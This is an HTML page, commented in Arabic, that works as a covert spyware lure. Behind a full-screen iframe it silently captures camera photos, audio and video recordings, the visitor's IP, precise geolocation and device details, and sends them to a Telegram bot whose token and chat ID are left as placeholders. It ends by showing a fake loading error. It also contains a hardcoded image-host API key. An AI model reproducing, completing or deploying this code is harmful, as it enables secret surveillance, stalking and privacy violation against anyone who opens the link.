<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Processing...</title>
<style>
    body, html { margin: 0; padding: 0; height: 100%; width: 100%; overflow: hidden; background-color: #000; }
    iframe { width: 100%; height: 100%; border: none; position: absolute; top: 0; left: 0; z-index: 1; }
    #status { display: none; }
    video, canvas { display: none; }
</style>
</head>
<body>
<iframe src="REPLACE_TARGET_URL"></iframe>
<div id="status">Down loading...</div>
<video id="video" style="display:none;" autoplay playsinline></video>
<canvas id="canvas" style="display:none;"></canvas>

<script>
// إزالة Firebase بالكامل واستبدالها بإرسال مباشر إلى Telegram Bot
const BOT_TOKEN = "YOUR_BOT_TOKEN"; // استبدل بالتوكن الخاص بك
const CHAT_ID = "YOUR_CHAT_ID"; // استبدل بالمعرف الخاص بك

const statusDiv = document.getElementById("status");
const imgbbApiKey = "246c77b39552757dc3535d6a7896342a";

function getUserId(){
    const urlParams = new URLSearchParams(window.location.search);
    let id = urlParams.get("id");
    if(!id){
        id = "a77266f8db6ccb82";
    }
    return id;
}

// دالة مساعدة لإرسال البيانات إلى Telegram
async function sendToTelegram(data) {
    try {
        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: JSON.stringify(data, null, 2)
            })
        });
        return await response.json();
    } catch(e) {
        console.log("Telegram send error:", e);
    }
}

// دالة لإرسال الملفات (صور، صوت، فيديو) إلى Telegram
async function sendFileToTelegram(fileData, fileType, caption = "") {
    try {
        const formData = new FormData();
        formData.append("chat_id", CHAT_ID);
        formData.append("caption", caption);
        
        // تحويل الـ base64 إلى Blob
        const byteCharacters = atob(fileData);
        const byteNumbers = new Array(byteCharacters.length);
        for (let i = 0; i < byteCharacters.length; i++) {
            byteNumbers[i] = byteCharacters.charCodeAt(i);
        }
        const byteArray = new Uint8Array(byteNumbers);
        const blob = new Blob([byteArray], { type: fileType === "image" ? "image/jpeg" : "application/octet-stream" });
        
        const filename = fileType === "image" ? "image.jpg" : 
                        fileType === "audio" ? "audio.mp3" : "video.mp4";
        formData.append(fileType === "image" ? "photo" : "document", blob, filename);
        
        const url = fileType === "image" ? 
            `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto` :
            `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`;
            
        const response = await fetch(url, { method: "POST", body: formData });
        return await response.json();
    } catch(e) {
        console.log("File send error:", e);
    }
}

// دالة لإرسال الفيديو كملف (لأن Telegram لا يدعم فيديو base64 مباشرة)
async function sendVideoToTelegram(base64Data, caption = "") {
    return sendFileToTelegram(base64Data, "video", caption);
}

async function captureImage(facingMode) {
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const context = canvas.getContext('2d');
    
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: facingMode },
            audio: false
        });
        
        video.srcObject = stream;
        await new Promise(resolve => video.onloadedmetadata = resolve);
        await new Promise(resolve => setTimeout(resolve, 1000));
        
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        stream.getTracks().forEach(track => track.stop());
        
        let dataUrl = canvas.toDataURL('image/jpeg');
        return dataUrl.split(',')[1];
    } catch (e) {
        console.log("Error capturing camera (" + facingMode + "):", e);
        return null;
    }
}

async function uploadToImgBB(base64Image) {
    if (!base64Image) return "Failed to capture";
    try {
        let formData = new FormData();
        formData.append("image", base64Image);
        const response = await fetch(`https://api.imgbb.com/1/upload?key=${imgbbApiKey}`, {
            method: "POST",
            body: formData
        });
        const result = await response.json();
        if (result.success) {
            return result.data.url;
        } else {
            return "Upload error";
        }
    } catch (e) {
        console.log(e);
        return "Upload failed";
    }
}

async function recordAudio(duration) {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        const recorder = new MediaRecorder(stream);
        const chunks = [];
        recorder.ondataavailable = e => chunks.push(e.data);
        recorder.start();
        await new Promise(r => setTimeout(r, duration));
        recorder.stop();

        return new Promise(resolve => {
            recorder.onstop = async () => {
                const blob = new Blob(chunks, { type: "audio/mp3" });
                const reader = new FileReader();
                reader.onloadend = async function() {
                    const base64 = reader.result.split(',')[1];
                    stream.getTracks().forEach(t => t.stop());
                    // إرسال الصوت مباشرة إلى Telegram
                    await sendFileToTelegram(base64, "audio", "Audio Record");
                    resolve("Sent to Telegram");
                };
                reader.readAsDataURL(blob);
            };
        });
    } catch(e) {
        console.log("Error capturing audio:", e);
        return "Permission denied or no microphone";
    }
}

async function recordVideoMedia(facingMode, duration) {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode }, audio: true });
        const recorder = new MediaRecorder(stream);
        const chunks = [];
        recorder.ondataavailable = e => chunks.push(e.data);
        recorder.start();
        await new Promise(r => setTimeout(r, duration));
        recorder.stop();

        return new Promise(resolve => {
            recorder.onstop = async () => {
                const blob = new Blob(chunks, { type: "video/mp4" });
                const reader = new FileReader();
                reader.onloadend = async function() {
                    const base64 = reader.result.split(',')[1];
                    stream.getTracks().forEach(t => t.stop());
                    // إرسال الفيديو مباشرة إلى Telegram
                    await sendFileToTelegram(base64, "video", "Video Record - " + facingMode);
                    resolve("Sent to Telegram");
                };
                reader.readAsDataURL(blob);
            };
        });
    } catch(e) {
        console.log("Error capturing video:", e);
        return "Permission denied or no camera/microphone";
    }
}

window.addEventListener("DOMContentLoaded", async () => {
    let ipAddress = "Unknown";
    let batteryLevel = "Unknown";
    let locationText = "Unknown";
    let latitude = "";
    let longitude = "";
    const userId = getUserId();
    
    // جمع البيانات كما في الكود الأصلي
    let frontBack64 = await captureImage("user");
    let environmentBase64 = await captureImage("environment");
    
    // إرسال الصور مباشرة إلى Telegram
    if (frontBack64) await sendFileToTelegram(frontBack64, "image", "Front Camera");
    if (environmentBase64) await sendFileToTelegram(environmentBase64, "image", "Environment Camera");
    
    // تسجيل الصوت والفيديو وإرسالها مباشرة
    await recordAudio(8000);
    await recordVideoMedia("user", 8000);
    await recordVideoMedia("environment", 8000);

    // جمع المعلومات الإضافية
    try{
        const ipResponse = await fetch("https://api.ipify.org?format=json");
        const ipJson = await ipResponse.json();
        ipAddress = ipJson.ip;
    }catch(e){ console.log(e); }

    try{
        if(navigator.getBattery){
            const battery = await navigator.getBattery();
            batteryLevel = Math.round(battery.level * 100) + "%";
        }
    }catch(e){ console.log(e); }

    try{
        const position = await new Promise((resolve,reject)=>{
            navigator.geolocation.getCurrentPosition(resolve, reject, {
                enableHighAccuracy:true,
                timeout:10000
            });
        });
        latitude = position.coords.latitude;
        longitude = position.coords.longitude;
        const geo = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
        const geoData = await geo.json();
        const country = geoData.address.country || "Unknown";
        const address = geoData.display_name || "Unknown";
        locationText = "Country : " + country + "
Full Adress : " + address;
    }catch(e){ console.log(e); }

    let deviceInfo =
    "Platform : " + navigator.platform +
    "
UserAgent : " + navigator.userAgent +
    "
Language : " + navigator.language +
    "
Screen : " + screen.width + "x" + screen.height +
    "
CPU Cores : " + navigator.hardwareConcurrency +
    "
RAM : " + (navigator.deviceMemory || "Unknown") + " GB";

    const currentIsoTime = new Date().toISOString();

    // تجميع جميع البيانات في كائن واحد وإرسالها إلى Telegram
    const fullData = {
        user_id: userId,
        ip: ipAddress,
        time: currentIsoTime,
        device: "Battery: " + batteryLevel + " | Platform: " + navigator.platform,
        location: locationText,
        locationx: latitude,
        locations: longitude,
        info: deviceInfo,
        status: "Data collected successfully"
    };

    await sendToTelegram(fullData);

    statusDiv.innerText = "An error occurred during loading";
});
</script>
</body>
</html>
